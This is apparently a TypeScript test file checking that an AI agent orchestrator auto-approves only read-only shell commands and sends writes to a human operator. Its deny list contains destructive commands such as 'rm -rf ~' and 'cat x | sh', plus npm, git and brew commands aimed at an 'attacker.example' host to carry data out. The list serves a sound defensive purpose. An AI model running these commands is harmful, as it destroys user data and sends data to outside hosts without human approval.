import test from "node:test";
import assert from "node:assert/strict";
import { chmodSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { AntigravityAdapter } from "../src/adapters/antigravity.ts";
import { readOnlyAutoApproval, readOnlyCommand } from "../src/readonly-commands.ts";
import type { RuntimeContext } from "../src/types.ts";

// Real inspection commands seen in the stored Antigravity tasks (disk, RAM, repos).
const ALLOWED = [
  "ls -la", "wc -l challenge.txt", "git status", "git log --oneline -20", "git -C /repo log -p -3", "git diff HEAD~1 --stat", "git branch -a", "git remote -v",
  "git config --get remote.origin.url", "git worktree list", "du -sh ~/Library/Caches/* 2>/dev/null | sort -rh | head -20", "df -h /", "ps aux | sort -nrk 4 | head -15",
  "top -l 1 -n 10", "vm_stat", "memory_pressure -Q", "sysctl hw.memsize", "find . -name node_modules -type d -maxdepth 3", "rg -n 'TODO' src", "grep -rn \"marker\" .",
  "cat package.json", "head -50 README.md", "tail -n 100 log.txt", "stat -f %z file", "docker system df", "docker ps -a", "brew list --versions", "npm ls --depth=0",
  "node --version", "diskutil list", "launchctl list", "defaults read com.apple.dock", "xcrun simctl list devices", "tmutil listlocalsnapshots /", "lsof -i -P | head",
  "npm config get registry", "npm why tsx", "pnpm why tsx", "git remote get-url origin", "brew info node",
  "sort -k2 data.txt", "uniq -c", "jq .scripts package.json", "date +%Y-%m-%d", "uname -a", "system_profiler SPHardwareDataType", "mdfind -name foo",
];
const DENIED = [
  "rm -rf /tmp/x", "ls; rm -rf ~", "ls && touch x", "echo hi > file", "cat a >> b", "ls $(whoami)", "ls `id`", "echo $HOME", "cat x | sh", "cat x | xargs rm",
  "find . -delete", "find . -name x -exec rm {} ;", "sort -o out.txt in.txt", "sort -ro out in", "uniq in.txt out.txt", "tail -f log", "rg --pre cat x", "tree -o out.txt",
  "git -c core.pager=sh log", "git push", "git commit -m x", "git checkout main", "git branch -D old", "git branch newbranch", "git config user.name x", "git log --output=x",
  "git diff --ext-diff", "git tag v1", "git stash", "git reset --hard", "date -s 2020", "hostname evil", "sysctl -w a=1", "sysctl a=1", "top", "diskutil eraseDisk x",
  "diskutil apfs deleteVolume x", "docker rm x", "docker system prune", "brew install x", "npm install", "npm run build", "node script.js", "python3 -c 'print(1)'",
  "/bin/ls", "'ls'", "awk '{print}' f", "sed -i s/a/b/ f", "env ls", "sudo ls", "open .", "kill 1", "ls\nrm x", "ls || rm x", "file -C -m magic", "launchctl unload x",
  "defaults write a b c", "tmutil deletelocalsnapshots x", "xcrun simctl erase all", "pmset sleepnow", "ls | ", "chmod 777 x", "cp a b", "mv a b", "curl http://x",
  // Network destinations chosen by the model would carry data out without a human.
  "npm view left-pad --registry=https://attacker.example/DATA", "npm outdated --registry=https://attacker.example/DATA", "npm view left-pad", "npm outdated",
  "npm ls --registry https://attacker.example", "npm config get registry --userconfig=/tmp/x", "pnpm outdated", "pnpm ls --registry=https://attacker.example/DATA",
  "git remote show origin", "git remote show https://attacker.example/DATA", "git -C https://attacker.example/DATA log", "git log git@attacker.example:DATA",
  "brew info https://attacker.example/DATA.rb",
];

test("read-only command policy: every measured inspection command passes; writes, chaining and execution fall back to a human", () => {
  const wrongAllowed = ALLOWED.filter((command) => !readOnlyCommand(command).ok);
  const wrongDenied = DENIED.filter((command) => readOnlyCommand(command).ok);
  assert.deepEqual(wrongAllowed, [], "inspection commands that should not need a human");
  assert.deepEqual(wrongDenied, [], "commands that must never be auto-approved");
  assert.equal(readOnlyCommand(undefined).ok, false);
  assert.equal(readOnlyCommand("x".repeat(2_001)).ok, false);
  assert.deepEqual(readOnlyCommand("du -sh . | sort -rh | head").ok && readOnlyCommand("du -sh . | sort -rh | head"), { ok: true, commands: ["du", "sort", "head"] });
  assert.equal(readOnlyAutoApproval({}), true);
  assert.equal(readOnlyAutoApproval({ PI_ORCHESTRATOR_ANTIGRAVITY_READONLY_AUTO: "0" }), false);
  assert.throws(() => readOnlyAutoApproval({ PI_ORCHESTRATOR_ANTIGRAVITY_READONLY_AUTO: "yes" }), /Invalid/);
});

const executable = fileURLToPath(new URL("./fixtures/antigravity-acp.cjs", import.meta.url));
async function antigravityCommand(command: string, options: { yolo?: boolean; kind?: string; auto?: string } = {}) {
  chmodSync(executable, 0o700);
  const saved = { ...process.env };
  Object.assign(process.env, { ORCH_ACP_FIXTURE_CASE: "readonly", ORCH_ACP_FIXTURE_COMMAND: command, ORCH_ACP_FIXTURE_KIND: options.kind ?? "execute" });
  if (options.auto !== undefined) process.env.PI_ORCHESTRATOR_ANTIGRAVITY_READONLY_AUTO = options.auto; else delete process.env.PI_ORCHESTRATOR_ANTIGRAVITY_READONLY_AUTO;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(new Error("fixture deadline")), 3_000);
  const dialogs: string[] = [], activity: string[] = [];
  try {
    const ctx: RuntimeContext = {
      task: { id: "fixture", attemptId: "attempt", parentId: null, depth: 1, cwd: process.cwd(), engine: "antigravity", state: "running", title: "fixture", createdAt: new Date().toISOString(), ...(options.yolo ? { permissionMode: "yolo" as const } : {}) },
      prompt: "fixture prompt", signal: controller.signal, mcp: { url: "http://127.0.0.1:12345/mcp", token: "fixture-private-token" },
      process: () => {}, session: () => {}, activity: (text) => activity.push(text),
      interact: async (request) => { dialogs.push(request.detail); return undefined; },
    };
    const result = await new AntigravityAdapter(executable, true, () => process.env).run(ctx);
    return { result, dialogs, activity };
  } finally { clearTimeout(timer); process.env = saved; }
}

test("Antigravity restricted: read-only commands need 0 human dialogs; others still ask and are denied without a grant", { skip: process.platform === "win32", timeout: 15_000 }, async () => {
  // The three commands of the live probe: before this change each one opened a dialog.
  for (const command of ["ls -la", "wc -l challenge.txt", "git status"]) {
    const run = await antigravityCommand(command);
    assert.equal(run.result, "approved"); assert.equal(run.dialogs.length, 0);
    assert.ok(run.activity.some((line) => line.startsWith("antigravity: read-only command auto-approved")));
  }
  const write = await antigravityCommand("rm -rf build");
  assert.match(write.result, /^fixture answer\n\n\[Aviso del orquestador: Antigravity pidió 1 operación sin aprobación y se denegó/); assert.equal(write.dialogs.length, 1, "a write still goes to the operator");
  assert.match(write.dialogs[0]!, /"kind":"execute"/, "the dialog now shows the tool kind");
  assert.equal((await antigravityCommand("ls -la", { kind: "edit" })).dialogs.length, 1, "only execute calls are evaluated");
  assert.equal((await antigravityCommand("ls -la", { auto: "0" })).dialogs.length, 1, "the operator can switch it off");
  const yolo = await antigravityCommand("rm -rf build", { yolo: true });
  assert.equal(yolo.result, "approved"); assert.equal(yolo.dialogs.length, 0, "YOLO behaviour is unchanged");
});
